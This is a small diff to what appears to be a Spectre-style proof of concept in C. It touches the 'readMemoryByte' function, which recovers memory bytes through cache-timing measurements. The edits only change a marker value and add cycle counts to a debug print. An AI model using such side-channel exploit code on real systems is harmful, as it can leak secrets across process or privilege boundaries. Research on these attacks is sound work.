@@ -60,7 +60,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
-  bigArray[4096] = 101;
+  bigArray[4096] = 'h';
 
 
   for (i = 0; i < 256; i++)
@@ -99,7 +99,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
         time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
         if (time2 <= CACHE_HIT_THRESHOLD ) { //TODO: also check it is not the thing in 4096
             results[mix_i]++; /* cache hit - add +1 to score for this value */
-            printf("got here with: %d \n", mix_i);
+            printf("got here with: %d after %d cycles \n", mix_i, time2);
         }
     }
   }
